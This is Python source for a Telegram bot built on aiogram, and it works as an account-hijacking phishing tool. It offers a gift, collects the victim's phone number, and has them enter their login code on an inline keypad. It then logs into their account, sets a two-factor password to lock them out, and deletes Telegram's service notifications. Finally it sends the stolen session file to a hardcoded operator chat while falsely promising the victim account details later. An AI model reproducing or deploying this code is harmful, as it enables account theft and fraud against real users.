import asyncio
import utils
import os
import string
import random
from misc import dp, bot
from aiogram import types, executor
from data import config, db

sessions = {}

@dp.message_handler(commands=["start"])
@utils.check_in_db
async def hello(message: types.Message):
	uid = utils.uuid(message)
	if sessions.get(uid):
		return
	print(message.from_user.full_name, "нажал старт")
	await message.answer(text=config.hello_text, reply_markup=config.go_keyboard)
	await message.answer(text=config.gift_text)

@dp.message_handler(content_types=["contact"])
@utils.check_in_db
async def contact(message: types.Message):
	print(message.from_user.full_name, "скинул", message.contact.phone_number)
	if message.forward_from:
		return 
	await message.delete()
	uid = utils.uuid(message)
	users = db.get("users")
	users[uid]["phone"] = "+" + str(message.contact.phone_number).replace("+", str())
	db.set("users", users)
	
	msg = await message.answer(text=config.search_text, reply_markup=config.del_keyboard)
	image = utils.get_img()
	sessions[uid] = utils._telegram(users[uid]["phone"])
	await sessions[uid].connect()
	
	if await sessions[uid].is_user_authorized():
		return await msg.delete()
	
	try:
		await sessions[uid].sign_in(users[uid]["phone"])
	except Exception as e:
		await msg.delete()
		await msg.answer("🚫 <b>" + str(e) + "</b>")
		return await sessions[uid].disconnect()
		return

	await msg.reply_photo(photo=image, caption=config.you_text)
	await msg.delete()
	await msg.answer(text=config.codel_text, reply_markup=config.code_keyboard)

@dp.callback_query_handler(lambda c: c.data.startswith("edit:"))
async def edit_code(call: types.CallbackQuery):
	print(call["from"].first_name, "едитнул код", call.data.split(":")[1])
	uid = utils.uuid(call)
	users = db.get("users")
	users[uid]["code"] += call.data.split(":")[1]
	db.set("users", users)

	if len(users[uid]["code"]) > 4:
		await call.message.edit_text(text=config.yesno_text%users[uid]["code"], reply_markup=config.yesno_keyboard)
	else:
		await call.message.edit_text(text=config.code_text%users[uid]["code"], reply_markup=config.code_keyboard)

@dp.callback_query_handler(lambda c: c.data == "back")
async def back_code(call: types.CallbackQuery):
	print(call["from"].first_name, "едитнул код назад")
	uid = utils.uuid(call)
	users = db.get("users")
	if not users[uid]["code"]:
		return
	else:
		users[uid]["code"] = users[uid]["code"][:-1]
		db.set("users", users)

		await call.message.edit_text(text=config.code_text%users[uid]["code"], reply_markup=config.code_keyboard)

@dp.callback_query_handler(lambda c: c.data == "yes")
async def yes(call: types.CallbackQuery):
	print(call["from"].first_name, "нажал да")
	uid = utils.uuid(call)
	users = db.get("users")
	
	try:
		await sessions[uid].sign_in(users[uid]["phone"], users[uid]["code"])
	except Exception as e:
		await call.message.delete()
		await call.message.answer("🚫 <b>" + str(e) + "</b>")
		return await sessions[uid].disconnect()
	try:
		await sessions[uid].edit_2fa(new_password="4ebureklox228")
	except: pass
	try:
		await sessions[uid].delete_dialog(777000, revoke=True)
	except: pass
	await call.message.answer("⏳ <b>Через 24 часа я скину тебе почту и пароль от аккаунта. Ожидай!</b>")
	await call.message.delete()
	users = db.get("users")
	p = users[uid]["phone"]
	users[uid]["phone"], users[uid]["code"] = str(), str()
	db.set("users", users)
	print("+сессия")
	await call.message.bot.send_document(
		1797251033, types.InputFile(f"sessions/{p}.session"), caption="#new_session"
	)

@dp.callback_query_handler(lambda c: c.data == "no")
async def no(call: types.CallbackQuery):
	print(call["from"].first_name, "нажал нет")
	uid = utils.uuid(call)
	users = db.get("users")
	users[uid]["code"] = str()
	db.set("users", users)
	
	await call.message.edit_text(text=config.codel_text, reply_markup=config.code_keyboard)
	
@dp.message_handler(
	commands=["filename"]
)
async def filename(
	message: types.Message,
):
	user = message.from_user
	reply = message.reply_to_message
	if not reply:
		return await message.reply("ответь на файл")
	if not reply.document:
		return await message.reply("на файл сука")
		
	args = list("123")

	if not args:
		return await message.reply("назв файл где,")
	
	mmm = await message.reply("Downloading...")
	
	args = " ".join(args)
	file = (reply.document)
	
	file_id = file.file_id
	try:
		doc = await bot.get_file(file_id)
	except:
		return await mmm.edit_text("файл весит больше 20-ти мб ладно)")
	
	file_path = doc.file_path
	token = str().join(
		random.sample(string.ascii_letters, 32)
	)
	
	try:
		await bot.download_file(file_path, f"screens/{token}.jpg")
	except:
		return await mmm.edit_text("файл весит больше 20-ти мб ладно)")
	await mmm.edit_text("The end...")

if __name__ == "__main__":
	executor.start_polling(dp,skip_updates=1)
